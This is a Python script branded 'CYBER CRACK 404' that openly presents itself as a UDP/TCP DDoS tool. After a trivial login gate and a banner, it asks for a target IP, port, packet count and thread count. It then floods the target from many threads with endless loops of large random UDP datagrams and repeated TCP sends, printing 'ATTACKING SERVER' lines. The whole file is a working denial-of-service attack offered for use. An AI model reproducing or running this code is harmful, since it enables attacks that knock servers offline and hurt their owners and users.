#UDP/TCP TOOLS
#CYBER404 DDOS TOOLS
#TEAM CYBER CRACK 404
#Tools : CYBERCRACK404
import random
import socket
import threading
import os
import time

os.system("clear")
print("""\033[94m
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

""")

nama =str(input("\033[97m[?] User : "))
password =str(input("\033[97m[$] Password : "))
time.sleep(3)
os.system("clear")
print("\033[97m[!] Loading [\033[95m•••\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Loading [\033[95m••\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Loading [\033[95m•\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Loading [\033[95m••\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Loading [\033[95m•••\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Loading [\033[95m••\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Loading [\033[95m•\033[97m] !!!")
time.sleep(2)
os.system("clear")
if password == "player" and nama == "user":
	print("\033[97m[!] Login \033[92mSuccessful \033[97m!!!")
	time.sleep(3)
else:
	print("\033[97m[!] Password \033[91mWrong \033[97m!!!")
	time.sleep(999999)
os.system("clear")
print(f"""\033[96m    

==============================================================================
                            
                            *CYBER CRACK 404*

                       JANGAN DI SALAH GUNAKAN!!

                     KHUSUS UNTUK SERVER OTAK DONATE 

             JANGAN DI GUNAKAN UNTUK KESENANGAN DIRI SENDIRI!!
 
==============================================================================

\033[97m [!] Methods : \033[95mUDP | TCP
\033[97m [!] Discord : \033[95mNO DISCORD CC-TEAM
\033[97m [!] Team : \033[95mCYBER CRACK 404

\033[96m==========================
""")

dick =str(input("\033[97m[!] UPD|TCP | Methods » \033[91m"))
ip =str(input("\033[97m[!] SERVER | Ip » \033[91m"))
port =int(input("\033[97m[!] SERVER | Port » \033[91m"))
times =int(input("\033[97m[!]  | Packets » \033[91m"))
threads =int(input("\033[97m[!]  | Threads » \033[91m"))

def udp():
	data = os.urandom(65500)
	i = random.choice(("\033[95m[•]","[!]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(i +" \033[96mATTACKING SERVER IP = \033[91m%s \033[96mPORT = \033[91m%s \033[96m!!!"%(ip,port))
		except:
				print("\033[95m[!] \033[96mATTACKING SERVER IP = \033[91m%s \033[96mPORT = \033[91m%s \033[96m!!!"%(ip,port))
				
def udp2():
				data = os.urandom(65500)
				i = random.choice(("\033[95m[!]","[•]","[+]"))
				while True:
					try:
						s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
						addr =(str(ip),int(port))
						for x in range(times):
							s.sendto(data,addr)
							print(i +"\033[96m ATTACKING SERVER IP = \033[91m%s \033[96mPORT = \033[91m%s \033[96m!!!"%(ip,port))
					except:
						print("\033[95m[!]\033[96m ATTACKING SERVER IP = \033[91m%s \033[96mPORT = \033[91m%s \033[96m!!!"%(ip,port))
						
def tcp():
				data = os.urandom(20179)
				i = random.choice(("\033[95m[•]","[!]","[-]"))
				while True:
					try:
						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s.connect((ip,port))
						s.send(data)
						for x in range(times):
							s.send(data)
							print(i +"\033[96m ATTACKING SERVER IP = \033[91m%s \033[96mPORT = \033[91m%s \033[96m!!!"%(ip,port))
					except:
						s.close()
						print("\033[95m[!]\033[96m ATTACKING SERVER IP = \033[91m%s \033[96mPORT = \033[91m%s \033[96m!!!"%(ip,port))
						
for y in range(threads):
				if dick == 'UDP':
					th = threading.Thread(target = udp)
					th.start()
					th = threading.Thread(target = udp2)
					th.start()
				elif dick == 'TCP':
					th = threading.Thread(target = tcp)
					th.start()
				else:
					th = threading.Thread(target = udp)
					th.start()
					th= threading.Thread(target = udp2)
					th.start()
					th = threading.Thread(target = tcp)
					th.start()
				
